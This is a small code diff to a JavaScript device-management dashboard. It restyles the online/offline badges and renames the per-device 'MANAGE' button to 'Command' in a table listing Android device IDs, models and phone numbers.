@@ -30,8 +30,8 @@ const DevicesManager = {
                     <td><code style="color:var(--primary); font-weight:700">${dev.android_id}</code></td>
                     <td style="font-weight:500">${dev.model || 'Unknown Device'}</td>
                     <td style="color:var(--text-muted)">${dev.phone_numbers || '-'}</td>
-                    <td><span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span></td>
-                    <td><button onclick="showCommandModal('${dev.android_id}')" class="btn-primary" style="padding:0.5rem 1rem; font-size:0.75rem; background:var(--bg-card); border:1px solid var(--border)">MANAGE</button></td>
+                    <td><span class="${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '● Online' : '● Offline'}</span></td>
+                    <td><button onclick="showCommandModal('${dev.android_id}')" class="btn-primary" style="padding:0.35rem 0.75rem; font-size:0.75rem;">Command</button></td>
                 `;
                 tbody.appendChild(tr);
             });
